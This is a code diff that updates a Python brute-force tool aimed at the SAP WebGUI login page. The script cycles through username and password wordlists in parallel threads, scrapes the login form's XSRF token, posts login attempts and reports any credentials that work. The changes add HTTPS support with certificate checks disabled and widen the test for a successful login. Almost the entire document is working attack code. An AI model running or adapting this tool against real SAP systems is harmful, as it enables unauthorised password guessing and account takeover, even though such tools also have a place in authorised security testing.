@@ -3,15 +3,25 @@
 import requests, sys, threading, time, textwrap
 from bs4 import BeautifulSoup
 from argparse import ArgumentParser
+from urllib3.exceptions import InsecureRequestWarning
+
+requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
 
 found = ""
 banner = """
-  ___   _   ___  __      __   _               _   ___          _        __                
- / __| /_\ | _ \ \ \    / /__| |__  __ _ _  _(_) | _ )_ _ _  _| |_ ___ / _|___ _ _ __ ___ 
+  ___   _   ___  __      __   _               _   ___          _        __
+ / __| /_\ | _ \ \ \    / /__| |__  __ _ _  _(_) | _ )_ _ _  _| |_ ___ / _|___ _ _ __ ___
  \__ \/ _ \|  _/  \ \/\/ / -_) '_ \/ _` | || | | | _ \ '_| || |  _/ -_)  _/ _ \ '_/ _/ -_)
  |___/_/ \_\_|     \_/\_/\___|_.__/\__, |\_,_|_| |___/_|  \_,_|\__\___|_| \___/_| \__\___|
-                                   |___/                                                  
+                                   |___/
 """
+
+def build_url(server, port, prefix, ssl):
+    if ssl:
+        url =  "https://{}:{}{}".format(str(server), str(port), str(prefix))
+    else:
+        url =  "http://{}:{}{}".format(str(server), str(port), str(prefix))
+    return str(url)
 
 def handle_login(URL, CLIENT, SERVER, PORT, SAP_SID, USERNAME, PASSWORD):
     HEADERS = {
@@ -22,7 +32,7 @@ def handle_login(URL, CLIENT, SERVER, PORT, SAP_SID, USERNAME, PASSWORD):
     }
     session = requests.session()
     session.get(URL)
-    r = session.get(URL, allow_redirects=True)
+    r = session.get(URL, verify=False, allow_redirects=True)
     soup = BeautifulSoup(r.text, 'lxml')
     csrf_token = soup.select('input', name="sap-login-XSRF")[6]
     XSRF_COOKIE = csrf_token['value']
@@ -44,15 +54,15 @@ def handle_login(URL, CLIENT, SERVER, PORT, SAP_SID, USERNAME, PASSWORD):
             'sap-language-dropdown': 'English'
     }
 
-    r = session.post(URL, headers=HEADERS, data=PARAMS)
+    r = session.post(URL, headers=HEADERS, data=PARAMS, verify=False)
 
-    return r.status_code, r.history
+    return r.status_code, r.history, r.text
 
 def do_bruteforce(URL, CLIENT, SERVER, PORT, SAP_SID, USER_FILE, password):
         for username in USER_FILE:
                 username = username.strip("\n")
-                ret_code, ret_oldcode = handle_login(URL, CLIENT, SERVER, PORT, SAP_SID, username, password)
-                if (ret_code == 200) and (len(ret_oldcode) > 0):
+                ret_code, ret_oldcode, html_body = handle_login(URL, CLIENT, SERVER, PORT, SAP_SID, username, password)
+                if ((ret_code == 200) and (len(ret_oldcode) > 0)) or ('not&#x20;correct' not in html_body):
                         print(f"[+] Username/Password found: {username}:{password}\n")
                         global found
                         found = "1"
@@ -72,6 +82,7 @@ def parse_options():
     target.add_argument("--url", dest="URL_PREFIX", help="Define URL prefix (default: sap/bc/gui/sap/its/webgui)", default="/sap/bc/gui/sap/its/webgui")
     target.add_argument("--user-file", dest="USER_FILE", help="Path to file with usernames (one per line)")
     target.add_argument("--pass-file", dest="PASS_FILE", help="Path to file with password (one per line)")
+    target.add_argument("--ssl", dest="SSL", help="SSL True/False", default=False)
     options = parser.parse_args()
 
     return options
@@ -83,7 +94,7 @@ def buffer_wordlist(USER_FILE, PASS_FILE):
         with open(USER_FILE, "r") as usrfile:
                 for user in usrfile:
                         user_lst.append(user)
-        
+
         print("[*] Loading password wordlist...")
         with open(PASS_FILE) as pwfile:
                 for password in pwfile:
@@ -94,12 +105,13 @@ def buffer_wordlist(USER_FILE, PASS_FILE):
 def main():
         options = parse_options()
         try:
-                URL = "http://" + options.SERVER + ":" + options.PORT + options.URL_PREFIX
+                URL = build_url(server=options.SERVER, port=options.PORT, prefix=options.URL_PREFIX, ssl=options.SSL)
+                print(f"[+] Using the following URL: {URL}\n")
                 usrfile, pwfile = buffer_wordlist(options.USER_FILE, options.PASS_FILE)
                 for password in pwfile:
                         password = password.strip("\n")
                         process = threading.Thread(target=do_bruteforce, args=(URL, options.CLIENT, options.SERVER, options.PORT, options.SAP_SID, usrfile, password,))
-                        process.start()       
+                        process.start()
         except:
                 pass
 
